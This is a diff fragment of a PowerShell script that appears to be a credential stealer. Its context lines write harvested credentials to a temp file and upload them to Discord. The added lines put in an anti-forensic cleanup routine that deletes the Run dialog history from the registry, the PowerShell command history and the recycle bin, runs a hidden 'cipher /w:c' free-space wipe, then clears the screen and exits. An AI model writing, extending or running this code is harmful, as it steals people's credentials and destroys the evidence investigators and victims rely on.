@@ -100,10 +100,22 @@ echo $creds >> $env:TMP\$FileName
 
 Upload-Discord -file $env:TMP\User-Creds.txt
 
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
+function Clean-Exfil { 
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+}
+Clean-Exfil
+start powershell -argumentlist '-windowstyle hidden cipher /w:c'
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+cls
+exit
 
 
 
